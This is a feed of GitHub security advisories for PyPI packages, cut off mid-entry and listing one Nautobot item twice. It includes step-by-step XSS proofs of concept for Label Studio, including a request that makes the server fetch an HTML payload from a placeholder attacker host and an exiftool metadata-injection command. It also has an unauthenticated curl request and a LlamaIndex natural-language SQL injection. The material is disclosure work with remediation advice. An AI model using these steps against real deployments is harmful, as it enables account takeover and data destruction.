{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Python packages hosted at PyPI.org",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/pip.json",
    "description": "Security Advisory for Python packages hosted at PyPI.org on GitHub",
    "items": [
        {
            "content_html": "<h1 id=\"introduction\">Introduction</h1>\n<p>This write-up describes a vulnerability found in <a href=\"https://github.com/HumanSignal/label-studio\">Label Studio</a>, a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to <code>1.10.1</code> and was tested on version <code>1.9.2.post0</code>.</p>\n<h1 id=\"overview\">Overview</h1>\n<p><a href=\"https://github.com/HumanSignal/label-studio\">Label Studio</a> had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.</p>\n<h1 id=\"description\">Description</h1>\n<p>The following <a href=\"https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146\">code snippet in Label Studio</a> showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.</p>\n<pre><code class=\"language-python\">def tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] &lt;1&gt;\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n</code></pre>\n<ol>\n<li>The file name that was set was retrieved from the URL.</li>\n</ol>\n<p>The downloaded file path could then be retrieved by sending a request to <code>/api/projects/{project_id}/file-uploads?ids=[{download_id}]</code> where <code>{project_id}</code> was the ID of the project and <code>{download_id}</code> was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the <a href=\"https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62\">following code snippet</a> demonstrated that the <code>Content-Type</code> of the response was determined by the file extension, since <code>mimetypes.guess_type</code> guesses the <code>Content-Type</code> based on the file extension.</p>\n<pre><code class=\"language-python\">class UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} =&gt; {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) &lt;1&gt;\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n</code></pre>\n<ol>\n<li>Determines the <code>Content-Type</code> based on the extension of the uploaded file by using <code>mimetypes.guess_type</code>.</li>\n</ol>\n<p>Since the <code>Content-Type</code> was determined by the file extension of the downloaded file, an attacker could import in a <code>.html</code> file that would execute JavaScript when visited.</p>\n<h1 id=\"proof-of-concept\">Proof of Concept</h1>\n<p>Below were the steps to recreate this issue:</p>\n<ol>\n<li>Host the following HTML proof of concept (POC) script on an external website with the file extension <code>.html</code> that would be downloaded to the Label Studio website.</li>\n</ol>\n<pre><code class=\"language-html\">&lt;html&gt;\n    &lt;body&gt;\n        &lt;h1&gt;Data Import XSS&lt;/h1&gt;\n        &lt;script&gt;\n            alert(document.domain);\n        &lt;/script&gt;\n    &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n<ol start=\"2\">\n<li>Send the following <code>POST</code> request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the <code>{victim_host}</code> is the address and port of the victim Label Studio website (eg. <code>labelstudio.com:8080</code>), <code>{project_id}</code> is the ID of the project where the data would be imported into, <code>{cookies}</code> are session cookies and <code>{evil_site}</code> is the website hosting the malicious HTML file (named <code>xss.html</code> in the following example).</li>\n</ol>\n<pre><code class=\"language-http\">POST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n</code></pre>\n<ol start=\"3\">\n<li><p>To retrieve the downloaded file path could be retrieved by sending a <code>GET</code> request to <code>/api/projects/{project_id}/file-uploads?ids=[{download_id}]</code>, where <code>{download_id}</code> is the ID of the file download from the previous step.</p>\n</li>\n<li><p>Send your victim a link to <code>/data/{file_path}</code>, where <code>{file_path}</code> is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting <code>/data/upload/1/cfcfc340-xss.html</code>.</p>\n</li>\n</ol>\n<p><img alt=\"xss-import-alert\" src=\"https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png\"></p>\n<h1 id=\"impact\">Impact</h1>\n<p>Executing arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.</p>\n<h1 id=\"remediation-advice\">Remediation Advice</h1>\n<ul>\n<li>For all user provided files that are downloaded by Label Studio, set the <code>Content-Security-Policy: sandbox;</code> response header when viewed on the site. The <code>sandbox</code> directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a <code>same-origin</code> policy (<a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox\">documentation</a>).</li>\n<li>Restrict the allowed file extensions that could be downloaded.</li>\n</ul>\n<h1 id=\"discovered\">Discovered</h1>\n<ul>\n<li>August 2023, Alex Brown, elttam</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/HumanSignal/label-studio/security/advisories/GHSA-fq23-g58m-799r\">https://github.com/HumanSignal/label-studio/security/advisories/GHSA-fq23-g58m-799r</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-23633\">https://nvd.nist.gov/vuln/detail/CVE-2024-23633</a></li>\n<li><a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox\">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox</a></li>\n<li><a href=\"https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62\">https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62</a></li>\n<li><a href=\"https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146\">https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-fq23-g58m-799r\">https://github.com/advisories/GHSA-fq23-g58m-799r</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-fq23-g58m-799r",
            "title": "[label-studio] Cross-site Scripting Vulnerability on Data Import",
            "date_modified": "2024-01-24T14:21:49.000Z",
            "date_published": "2024-01-24T14:21:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-fq23-g58m-799r"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"introduction\">Introduction</h1>\n<p>This write-up describes a vulnerability found in <a href=\"https://github.com/HumanSignal/label-studio\">Label Studio</a>, a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to <code>1.9.2</code> and was tested on version <code>1.8.2</code>.</p>\n<h1 id=\"overview\">Overview</h1>\n<p><a href=\"https://github.com/HumanSignal/label-studio\">Label Studio</a> has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.</p>\n<h1 id=\"description\">Description</h1>\n<p>The following <a href=\"https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49\">code snippet in Label Studio</a> shows that the only verification check is that the file is an image by extracting the dimensions from the file.</p>\n<pre><code class=\"language-python\">\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename &lt;3&gt;\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) &lt;1&gt;\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w &gt; max_width or h &gt; max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') &lt;2&gt;\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) &gt; max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n</code></pre>\n<ol>\n<li>Attempts to get image dimensions to validate the uploaded avatar file is an image.</li>\n<li>Extracts the <code>Content-Type</code> from the upload <code>POST</code> request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. <code>image/jpeg</code>).</li>\n<li>The file extension of the uploaded file is never validated and is saved to the filesystem.</li>\n</ol>\n<p><a href=\"https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26\">Label Studio serves avatar images using Django's built-in <code>serve</code> view</a>, which is <a href=\"https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development\">not secure for production use according to Django's documentation</a>.</p>\n<pre><code class=\"language-python\">    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P&lt;path&gt;.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n</code></pre>\n<p>The issue with the Django <code>serve</code> view is that it determines the <code>Content-Type</code> of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a <code>.html</code> extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.</p>\n<h1 id=\"proof-of-concept\">Proof of Concept</h1>\n<p>Below are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.</p>\n<ol>\n<li>Using any JPEG or PNG image, add in the comment field in the metadata the HTML code <code>&lt;script&gt;alert(document.domain)&lt;/script&gt;</code>. This can be done using the <code>exiftool</code> command as shown below that was used to create the following image.</li>\n</ol>\n<pre><code class=\"language-bash\">exiftool -Comment='&lt;script&gt;alert(document.domain)&lt;/script&gt;' penguin.jpg\n</code></pre>\n<p><img alt=\"xss-penguin\" src=\"https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg\"></p>\n<ol start=\"2\">\n<li><p>On Label Studio, navigate to account &amp; settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a <code>.html</code> extension.</p>\n</li>\n<li><p>Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.</p>\n</li>\n</ol>\n<p><img alt=\"xss-alert\" src=\"https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png\"></p>\n<h1 id=\"impact\">Impact</h1>\n<p>Executing arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.</p>\n<h1 id=\"remediation-advice\">Remediation Advice</h1>\n<ul>\n<li>Validate the file extension on the server side, not in client-side code.</li>\n<li>Remove the use of Django's <code>serve</code> view and implement a secure controller for viewing uploaded avatar images.</li>\n<li>Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.</li>\n<li>Avoid trusting user controlled inputs.</li>\n</ul>\n<h1 id=\"discovered\">Discovered</h1>\n<ul>\n<li>August 2023, Alex Brown, elttam</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/HumanSignal/label-studio/security/advisories/GHSA-q68h-xwq5-mm7x\">https://github.com/HumanSignal/label-studio/security/advisories/GHSA-q68h-xwq5-mm7x</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-47115\">https://nvd.nist.gov/vuln/detail/CVE-2023-47115</a></li>\n<li><a href=\"https://github.com/HumanSignal/label-studio/commit/a7a71e594f32ec4af8f3f800d5ccb8662e275da3\">https://github.com/HumanSignal/label-studio/commit/a7a71e594f32ec4af8f3f800d5ccb8662e275da3</a></li>\n<li><a href=\"https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development\">https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development</a></li>\n<li><a href=\"https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49\">https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49</a></li>\n<li><a href=\"https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26\">https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-q68h-xwq5-mm7x\">https://github.com/advisories/GHSA-q68h-xwq5-mm7x</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-q68h-xwq5-mm7x",
            "title": "[label-studio] Cross-site Scripting Vulnerability on Avatar Upload",
            "date_modified": "2024-01-24T14:21:29.000Z",
            "date_published": "2024-01-24T14:21:29.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-q68h-xwq5-mm7x"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A stored cross-site scripting (XSS) vulnerability exists in Apache Superset before 3.0.3.&nbsp;An authenticated attacker with create/update permissions on charts or dashboards could store a script or add a specific HTML snippet that would act as a stored XSS.</p>\n<p>For 2.X versions, users should change their config to include:</p>\n<p>TALISMAN_CONFIG = {\n&nbsp; &nbsp; \"content_security_policy\": {\n&nbsp; &nbsp; &nbsp; &nbsp; \"base-uri\": [\"'self'\"],\n&nbsp; &nbsp; &nbsp; &nbsp; \"default-src\": [\"'self'\"],\n&nbsp; &nbsp; &nbsp; &nbsp; \"img-src\": [\"'self'\", \"blob:\", \"data:\"],\n&nbsp; &nbsp; &nbsp; &nbsp; \"worker-src\": [\"'self'\", \"blob:\"],\n&nbsp; &nbsp; &nbsp; &nbsp; \"connect-src\": [\n&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; \"'self'\",\n&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; \" <a href=\"https://api.mapbox.com\">https://api.mapbox.com</a>\" <a href=\"https://api.mapbox.com\">https://api.mapbox.com</a>\" ;,\n&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; \" <a href=\"https://events.mapbox.com\">https://events.mapbox.com</a>\" <a href=\"https://events.mapbox.com\">https://events.mapbox.com</a>\" ;,\n&nbsp; &nbsp; &nbsp; &nbsp; ],\n&nbsp; &nbsp; &nbsp; &nbsp; \"object-src\": \"'none'\",\n&nbsp; &nbsp; &nbsp; &nbsp; \"style-src\": [\n&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; \"'self'\",\n&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; \"'unsafe-inline'\",\n&nbsp; &nbsp; &nbsp; &nbsp; ],\n&nbsp; &nbsp; &nbsp; &nbsp; \"script-src\": [\"'self'\", \"'strict-dynamic'\"],\n&nbsp; &nbsp; },\n&nbsp; &nbsp; \"content_security_policy_nonce_in\": [\"script-src\"],\n&nbsp; &nbsp; \"force_https\": False,\n&nbsp; &nbsp; \"session_cookie_secure\": False,\n}</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-49657\">https://nvd.nist.gov/vuln/detail/CVE-2023-49657</a></li>\n<li><a href=\"https://lists.apache.org/thread/wjyvz8om9nwd396lh0bt156mtwjxpsvx\">https://lists.apache.org/thread/wjyvz8om9nwd396lh0bt156mtwjxpsvx</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2024/01/23/5\">http://www.openwall.com/lists/oss-security/2024/01/23/5</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rwhh-6x83-84v6\">https://github.com/advisories/GHSA-rwhh-6x83-84v6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rwhh-6x83-84v6",
            "title": "[apache-superset] Cross-site Scripting in Apache superset",
            "date_modified": "2024-01-23T21:35:09.000Z",
            "date_published": "2024-01-23T15:30:58.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rwhh-6x83-84v6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>LlamaIndex (aka llama_index) through 0.9.35 allows SQL injection via the Text-to-SQL feature in NLSQLTableQueryEngine, SQLTableRetrieverQueryEngine, NLSQLRetriever, RetrieverQueryEngine, and PGVectorSQLQueryEngine. For example, an attacker might be able to delete this year's student records via \"Drop the Students table\" within English language input.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-23751\">https://nvd.nist.gov/vuln/detail/CVE-2024-23751</a></li>\n<li><a href=\"https://github.com/run-llama/llama_index/issues/9957\">https://github.com/run-llama/llama_index/issues/9957</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/llama-index/PYSEC-2024-12.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/llama-index/PYSEC-2024-12.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2jxw-4hm4-6w87\">https://github.com/advisories/GHSA-2jxw-4hm4-6w87</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2jxw-4hm4-6w87",
            "title": "[llama-index] SQL injection in llama-index",
            "date_modified": "2024-01-23T20:10:03.000Z",
            "date_published": "2024-01-22T03:30:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2jxw-4hm4-6w87"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>All users of Nautobot versions earlier than 1.6.10 or 2.1.2 are potentially impacted.</p>\n<p>Due to inadequate input sanitization, any user-editable fields that support Markdown rendering, including:</p>\n<ul>\n<li><code>Circuit.comments</code></li>\n<li><code>Cluster.comments</code></li>\n<li><code>CustomField.description</code></li>\n<li><code>Device.comments</code></li>\n<li><code>DeviceRedundancyGroup.comments</code></li>\n<li><code>DeviceType.comments</code></li>\n<li><code>Job.description</code></li>\n<li><code>JobLogEntry.message</code></li>\n<li><code>Location.comments</code></li>\n<li><code>Note.note</code></li>\n<li><code>PowerFeed.comments</code></li>\n<li><code>Provider.noc_contact</code></li>\n<li><code>Provider.admin_contact</code></li>\n<li><code>Provider.comments</code></li>\n<li><code>ProviderNetwork.comments</code></li>\n<li><code>Rack.comments</code></li>\n<li><code>Tenant.comments</code></li>\n<li><code>VirtualMachine.comments</code></li>\n<li>Contents of any custom fields of type <code>markdown</code></li>\n<li>Job class <code>description</code> attributes</li>\n<li>The <code>SUPPORT_MESSAGE</code> system configuration setting</li>\n</ul>\n<p>are potentially susceptible to cross-site scripting (XSS) attacks via maliciously crafted data.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Fixed in Nautobot versions 1.6.10 and 2.1.2.</p>\n<h3 id=\"references\">References</h3>\n<p><a href=\"https://github.com/nautobot/nautobot/pull/5133\">https://github.com/nautobot/nautobot/pull/5133</a>\n<a href=\"https://github.com/nautobot/nautobot/pull/5134\">https://github.com/nautobot/nautobot/pull/5134</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/nautobot/nautobot/security/advisories/GHSA-v4xv-795h-rv4h\">https://github.com/nautobot/nautobot/security/advisories/GHSA-v4xv-795h-rv4h</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-23345\">https://nvd.nist.gov/vuln/detail/CVE-2024-23345</a></li>\n<li><a href=\"https://github.com/nautobot/nautobot/pull/5133\">https://github.com/nautobot/nautobot/pull/5133</a></li>\n<li><a href=\"https://github.com/nautobot/nautobot/pull/5134\">https://github.com/nautobot/nautobot/pull/5134</a></li>\n<li><a href=\"https://github.com/nautobot/nautobot/commit/17effcbe84a72150c82b138565c311bbee357e80\">https://github.com/nautobot/nautobot/commit/17effcbe84a72150c82b138565c311bbee357e80</a></li>\n<li><a href=\"https://github.com/nautobot/nautobot/commit/64312a4297b5ca49b6cdedf477e41e8e4fd61cce\">https://github.com/nautobot/nautobot/commit/64312a4297b5ca49b6cdedf477e41e8e4fd61cce</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-v4xv-795h-rv4h\">https://github.com/advisories/GHSA-v4xv-795h-rv4h</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-v4xv-795h-rv4h",
            "title": "[nautobot] XSS potential in rendered Markdown fields (comments, description, notes, etc.)",
            "date_modified": "2024-01-23T14:44:23.000Z",
            "date_published": "2024-01-23T14:44:22.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-v4xv-795h-rv4h"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>All users of Nautobot versions earlier than 1.6.10 or 2.1.2 are potentially impacted.</p>\n<p>Due to inadequate input sanitization, any user-editable fields that support Markdown rendering, including:</p>\n<ul>\n<li><code>Circuit.comments</code></li>\n<li><code>Cluster.comments</code></li>\n<li><code>CustomField.description</code></li>\n<li><code>Device.comments</code></li>\n<li><code>DeviceRedundancyGroup.comments</code></li>\n<li><code>DeviceType.comments</code></li>\n<li><code>Job.description</code></li>\n<li><code>JobLogEntry.message</code></li>\n<li><code>Location.comments</code></li>\n<li><code>Note.note</code></li>\n<li><code>PowerFeed.comments</code></li>\n<li><code>Provider.noc_contact</code></li>\n<li><code>Provider.admin_contact</code></li>\n<li><code>Provider.comments</code></li>\n<li><code>ProviderNetwork.comments</code></li>\n<li><code>Rack.comments</code></li>\n<li><code>Tenant.comments</code></li>\n<li><code>VirtualMachine.comments</code></li>\n<li>Contents of any custom fields of type <code>markdown</code></li>\n<li>Job class <code>description</code> attributes</li>\n<li>The <code>SUPPORT_MESSAGE</code> system configuration setting</li>\n</ul>\n<p>are potentially susceptible to cross-site scripting (XSS) attacks via maliciously crafted data.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Fixed in Nautobot versions 1.6.10 and 2.1.2.</p>\n<h3 id=\"references\">References</h3>\n<p><a href=\"https://github.com/nautobot/nautobot/pull/5133\">https://github.com/nautobot/nautobot/pull/5133</a>\n<a href=\"https://github.com/nautobot/nautobot/pull/5134\">https://github.com/nautobot/nautobot/pull/5134</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/nautobot/nautobot/security/advisories/GHSA-v4xv-795h-rv4h\">https://github.com/nautobot/nautobot/security/advisories/GHSA-v4xv-795h-rv4h</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-23345\">https://nvd.nist.gov/vuln/detail/CVE-2024-23345</a></li>\n<li><a href=\"https://github.com/nautobot/nautobot/pull/5133\">https://github.com/nautobot/nautobot/pull/5133</a></li>\n<li><a href=\"https://github.com/nautobot/nautobot/pull/5134\">https://github.com/nautobot/nautobot/pull/5134</a></li>\n<li><a href=\"https://github.com/nautobot/nautobot/commit/17effcbe84a72150c82b138565c311bbee357e80\">https://github.com/nautobot/nautobot/commit/17effcbe84a72150c82b138565c311bbee357e80</a></li>\n<li><a href=\"https://github.com/nautobot/nautobot/commit/64312a4297b5ca49b6cdedf477e41e8e4fd61cce\">https://github.com/nautobot/nautobot/commit/64312a4297b5ca49b6cdedf477e41e8e4fd61cce</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-v4xv-795h-rv4h\">https://github.com/advisories/GHSA-v4xv-795h-rv4h</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-v4xv-795h-rv4h",
            "title": "[nautobot] XSS potential in rendered Markdown fields (comments, description, notes, etc.)",
            "date_modified": "2024-01-23T14:44:23.000Z",
            "date_published": "2024-01-23T14:44:22.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-v4xv-795h-rv4h"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The vulnerability arises from the way the url parameter is incorporated into the command string without proper validation or sanitization. If the url is constructed from untrusted sources, an attacker could potentially inject malicious commands.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-0521\">https://nvd.nist.gov/vuln/detail/CVE-2024-0521</a></li>\n<li><a href=\"https://huntr.com/bounties/a569c64b-1e2b-4bed-a19f-47fd5a3da453\">https://huntr.com/bounties/a569c64b-1e2b-4bed-a19f-47fd5a3da453</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-chj7-w3f6-cvfj\">https://github.com/advisories/GHSA-chj7-w3f6-cvfj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-chj7-w3f6-cvfj",
            "title": "[paddlepaddle] Code Injection in paddlepaddle",
            "date_modified": "2024-01-23T14:41:51.000Z",
            "date_published": "2024-01-20T21:30:25.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-chj7-w3f6-cvfj"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>API endpoint <code>/api/v1/watch/&lt;uuid&gt;/history</code> can be accessed by any unauthorized user.</p>\n<h3 id=\"details\">Details</h3>\n<p>WatchHistory resource does not have <code>@auth.check_token</code> annotation, which means it can be accessed without providing <code>x-api-key</code> header.</p>\n<p><a href=\"https://github.com/dgtlmoon/changedetection.io/blob/9510345e01ea8e308c339163d8e8b030ce5ac7f1/changedetectionio/api/api_v1.py#L129-L156\">https://github.com/dgtlmoon/changedetection.io/blob/9510345e01ea8e308c339163d8e8b030ce5ac7f1/changedetectionio/api/api_v1.py#L129-L156</a></p>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li>Get list of watch with <code>x-api-key</code>:</li>\n</ol>\n<pre><code class=\"language-sh\">$ curl -H \"x-api-key: apikeyhere\" http://localhost:5000/api/v1/watch\n{\"uuid\": ...}\n</code></pre>\n<ol start=\"2\">\n<li>Call for history of snapshots without <code>x-api-key</code>. Expected - 401/403 error. Actual - list of snapshots is listed.</li>\n</ol>\n<pre><code class=\"language-sh\">$ curl http://localhost:5000/api/v1/watch/uuid/history\n{\"timestamp\": \"/path/to/snapshot.txt\"}\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>Anybody can check one's watch history. However, because unauthorized party first needs to know watch UUID, and the watch history endpoint itself returns only paths to the snapshot on the server, an impact on users' data privacy is minimal.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/dgtlmoon/changedetection.io/security/advisories/GHSA-hcvp-2cc7-jrwr\">https://github.com/dgtlmoon/changedetection.io/security/advisories/GHSA-hcvp-2cc7-jrwr</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-23329\">https://nvd.nist.gov/vuln/detail/CVE-2024-23329</a></li>\n<li><a href=\"https://github.com/dgtlmoon/changedetection.io/commit/402f1e47e78ecd155b1e90f30cce424ff7763e0f\">https://github.com/dgtlmoon/changedetection.io/commit/402f1e47e78ecd155b1e90f30cce424ff7763e0f</a></li>\n<li><a href=\"https://github.com/dgtlmoon/changedetection.io/blob/9510345e01ea8e308c339163d8e8b030ce5ac7f1/changedetectionio/api/api_v1.py#L129-L156\">https://github.com/dgtlmoon/changedetection.io/blob/9510345e01ea8e308c339163d8e8b030ce5ac7f1/changedetectionio/api/api_v1.py#L129-L156</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-hcvp-2cc7-jrwr\">https://github.com/advisories/GHSA-hcvp-2cc7-jrwr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-hcvp-2cc7-jrwr",
            "title": "[changedetection.io] changedetection.io API endpoint is not secured with API token",
            "date_modified": "2024-01-23T12:50:59.000Z",
            "date_published": "2024-01-23T12:50:59.000Z",
            "author": {
                "name": "GitHub",
